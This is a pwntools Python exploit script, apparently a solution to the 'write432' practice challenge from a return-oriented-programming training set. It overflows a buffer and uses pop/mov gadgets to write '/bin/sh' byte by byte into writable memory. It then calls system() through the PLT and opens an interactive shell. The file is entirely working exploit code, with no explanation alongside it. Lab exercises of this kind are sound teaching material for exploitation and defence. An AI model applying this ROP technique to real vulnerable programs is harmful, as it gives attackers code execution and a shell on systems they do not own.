#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./write432')



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()
io.recvuntil("> ")

pop_regs = 0x080486da # : pop edi ; pop ebp ; ret
mov = 0x08048670 # : mov dword ptr [edi], ebp ; ret
mem = 0x0804a028

payload = (
    # populate 
    b"A" * 44 +
    p32(pop_regs) + # : pop edi ; pop ebp ; ret
    p32(mem) +
    p32(ord('/')) +
    p32(mov) +

    p32(pop_regs) + # : pop edi ; pop ebp ; ret
    p32(mem + 1) +
    p32(ord('b')) +
    p32(mov) +
   
    p32(pop_regs) + # : pop edi ; pop ebp ; ret
    p32(mem + 2) +
    p32(ord('i')) +
    p32(mov) +
 
    p32(pop_regs) + # : pop edi ; pop ebp ; ret
    p32(mem + 3) +
    p32(ord('n')) +
    p32(mov) +

    p32(pop_regs) + # : pop edi ; pop ebp ; ret
    p32(mem + 4) +
    p32(ord('/')) +
    p32(mov) +

    p32(pop_regs) + # : pop edi ; pop ebp ; ret
    p32(mem + 5) +
    p32(ord('s')) +
    p32(mov) +

    p32(pop_regs) + # : pop edi ; pop ebp ; ret
    p32(mem + 6) +
    p32(ord('h')) +
    p32(mov) +

    # system
    p32(exe.plt["system"]) +
    b"BBBB" +
    p32(mem)
)

io.sendline(payload)

io.interactive()

